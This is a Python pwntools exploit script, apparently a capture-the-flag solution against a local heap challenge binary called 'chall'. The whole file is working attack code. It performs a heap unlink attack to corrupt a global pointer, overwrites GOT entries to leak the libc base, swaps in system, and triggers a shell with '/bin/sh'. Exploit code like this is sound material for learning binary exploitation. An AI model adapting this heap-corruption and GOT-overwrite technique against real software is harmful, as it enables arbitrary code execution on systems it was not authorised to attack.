from pwn import *
context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(":",str(size))
def free(idx):
	cmd(3)
	p.sendlineafter("id:",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("id:",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter("id:",str(idx))
	p.sendafter(":",c)
p=process("./chall")
libc=ELF("./chall").libc

add(0x28)
add(0xf8)
add(0x18)

address=0x0000000006020C0
edit(0,p64(0x21)*2+p64(address-0x18)+p64(address-0x10)+p64(0x20))


free(1)
#
#
edit(0,'\x00'*0x18+p64(0x000000000602018)+p64(0x000000000602058))
edit(0,p64(0x0000000004006B0)[:-1]+'\n')
free(1)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(libc.symbols['atoi'])
log.warning(hex(base))
one=0xf02a4
edit(0,p64(base+libc.symbols['system'])[:-1]+'\n')

#p.sendline("/bin/sh")
edit(2,'/bin/sh\n')
gdb.attach(p,'b *0x000000000400A5A')
free(2)

p.interactive()
